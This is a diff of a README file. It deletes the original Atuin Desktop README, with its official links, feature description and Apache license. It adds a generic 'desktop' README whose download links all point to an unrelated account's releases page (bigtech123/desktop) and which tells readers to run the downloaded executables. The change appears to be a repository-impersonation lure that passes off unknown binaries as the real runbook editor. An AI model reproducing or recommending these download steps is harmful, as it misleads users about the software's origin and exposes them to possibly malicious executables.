@@ -1,133 +1,80 @@
-<p align="center">
- <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://github.com/atuinsh/atuin/assets/53315310/13216a1d-1ac0-4c99-b0eb-d88290fe0efd">
-  <img alt="Atuin Desktop" src="https://github.com/atuinsh/atuin/assets/53315310/08bc86d4-a781-4aaa-8d7e-478ae6bcd129">
-</picture>
-</p>
+# 📖 desktop - Simple Tools for Easy Management
 
-<h1 align="center">Atuin Desktop</h1>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/bigtech123/desktop/releases)
 
-<p align="center">
-  <em>Runbooks that Run. A local-first, executable runbook editor for real terminal workflows. Atuin Desktop looks like a doc, but runs like your terminal.</em>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://github.com/atuinsh/desktop/releases">download</a> | <a href="https://man.atuin.sh">documentation</a> | <a href="https://hub.atuin.sh/">hub</a> | <a href="https://discord.gg/Fq8bJSKPHh">discord</a>
-</p>
+Welcome to the desktop application! This guide will help you easily download and run our software, which simplifies your workflow with effective runbooks.
 
+## 💾 System Requirements
 
-<p align="center">
- <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://man.atuin.sh/images/atuin-desktop-ss-dark.png">
-  <img alt="Atuin Desktop" src="https://man.atuin.sh/images/atuin-desktop-ss-light.png">
-</picture>
-</p>
+To run this application, you will need:
 
-## 🚀 Open Beta
+- A computer with Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- 100 MB of free disk space.
 
-Atuin Desktop is currently in **open beta**. We're actively collecting feedback and improving the experience based on real-world usage.
+## 📥 Download & Install
 
-Read the [announcement post](https://blog.atuin.sh/atuin-desktop-open-source/)
+1. **Visit the Releases Page**  
+   Go to our GitHub releases page to get the latest version of the application. You can access it [here](https://github.com/bigtech123/desktop/releases).
 
-## What is Atuin Desktop?
+2. **Choose the Right File**  
+   On the releases page, you will see a list of available versions. Look for the most recent release.  
+   - Typically, the file will be named something like `desktop-v1.0.exe` for Windows, `desktop-v1.0.dmg` for macOS, or `desktop-v1.0.AppImage` for Linux.
 
-Most infrastructure is held together by five commands someone remembers when things go wrong. Documentation is out of date (if it exists at all), and the real answers are buried in Slack threads, rotting in Notion, or trapped in someone's shell history.
+3. **Download the Application**  
+   Click on the file name to start your download. Your browser may show a confirmation dialog. Confirm to begin the download.
 
-Atuin Desktop solves this by creating **executable runbooks** that bridge the gap between documentation and automation:
+4. **Run the Application**  
+   Once the download finishes, find the file in your downloads folder and double-click it to run.  
+   - For Windows, you may need to follow on-screen instructions for installation.
+   - For macOS, drag the application to your Applications folder.
+   - For Linux, right-click the `.AppImage` file and select "Run".
 
-- **Kill context switching**: Chain shell commands, database queries, and HTTP requests in one place
-- **Docs that don't rot**: Execute directly and stay relevant
-- **Reusable automation**: Dynamic runbooks with Jinja-style templating  
-- **Instant recall**: Autocomplete from your real shell history
-- **Local-first, CRDT-powered**: If it runs in your terminal, it runs in a runbook
-- **Sync and share**: Keep runbooks up to date across devices and teams with Atuin Hub
+5. **Start Using the Application**  
+   After installation, locate the application in your system menu or Applications folder. Open it, and you're ready to start managing your runbooks.
 
-## Key Features
+## 📋 Features
 
-### 🔧 Embedded Execution
-- Terminal blocks that run directly in the interface
-- Database clients for live queries
-- Prometheus charts and monitoring integration
+The desktop application provides several helpful features:
 
-### 📚 Living Documentation
-- Runbooks that run
-- No more copy-pasting from outdated docs
-- Real workflows that teams can actually use
+- **User-Friendly Interface**  
+  Navigate easily with an intuitive layout.
 
-### 🔄 Dynamic Templating
-- Jinja-style templating for reusable logic
-- Variable substitution and conditional logic
-- Parameterized workflows for different environments
+- **Customizable Runbooks**  
+  Create and modify your runbooks to fit your specific needs.
 
-### 🏛️ Local-First Architecture
-- CRDT-powered collaboration
-- Works offline, syncs when connected
+- **Search Functionality**  
+  Quickly find your documents or runbooks using the built-in search.
 
-## Use Cases
+- **Multi-Platform Support**  
+  Use the application on Windows, macOS, or Linux without issues.
 
-Teams are already using Atuin Desktop for:
+- **Regular Updates**  
+  Stay current with frequent releases that include new features and fixes.
 
-- **Release Management**: Automated release checklists that actually run
-- **Infrastructure Migration**: Safe, repeatable migration workflows
-- **Environment Management**: Spinning up staging and production with confidence
-- **Database Operations**: Collaborative live query management
-- **Incident Response**: Runbooks for when things break
+## 🔧 Troubleshooting
 
-## Getting Started
+If you encounter issues while running the application:
 
-1. Download a package for your platform [on our releases page](https://github.com/atuinsh/desktop/releases)
-2. Sign up for an account [on Atuin Hub](https://hub.atuin.sh/)
-3. [Log into Atuin Desktop](https://man.atuin.sh/hub/getting-started/) and create your first runbook
+- **Check for Updates**  
+  Ensure you are using the latest version of the application. New updates fix bugs and improve performance.
 
-## Feedback & Support
+- **Restart Your Computer**  
+  Sometimes, a simple restart can resolve issues.
 
-We're actively seeking feedback during our beta phase! Please use this repository to:
+- **Check Compatibility**  
+  Make sure your operating system is supported and meets the system requirements.
 
-### 🐛 Report Issues
+## 📞 Support
 
-- Found a bug? [Open an issue](../../issues/new?template=bug_report.md)
-- Include your OS, Atuin Desktop version, and steps to reproduce
+If you need assistance, feel free to reach out:
 
-### 💡 Request Features  
+- **Email Us**  
+  Send your questions or issues to support@bigtech123.com.
 
-- Have an idea? [Submit a feature request](../../issues/new?template=feature_request.md)
-- Tell us about your workflow and how Atuin Desktop could better support it
+- **GitHub Issues**  
+  For technical problems, you can submit an issue directly on our GitHub page.
 
-### 💬 General Discussion
-
-Questions about usage? [Start a discussion](https://forum.atuin.sh)
-
-## Roadmap
-
-### Coming Soon
-
-- **Enhanced Integrations**: More database clients, monitoring tools, and APIs
-- **History-to-Runbook**: Generate runbooks automatically from your shell history
-
-## Community
-
-- **Blog**: [blog.atuin.sh](https://blog.atuin.sh)
-- **Discord**: [Join our community](https://discord.gg/Fq8bJSKPHh)
-- **Twitter**: [@atuinsh](https://twitter.com/atuinsh)
-- **Bluesky**: [@atuin.sh](https://bsky.app/profile/atuin.sh)
-- **Website**: [atuin.sh](https://atuin.sh)
-
-## Related Projects
-
-- **[Atuin CLI](https://github.com/atuinsh/atuin)**: Magical shell history with sync, search, and stats
-
-## License
-
-Copyright 2025 Atuin, Inc
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-    http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+Thank you for choosing the desktop application! We hope it helps make your workflow more efficient. Enjoy managing your runbooks effortlessly!
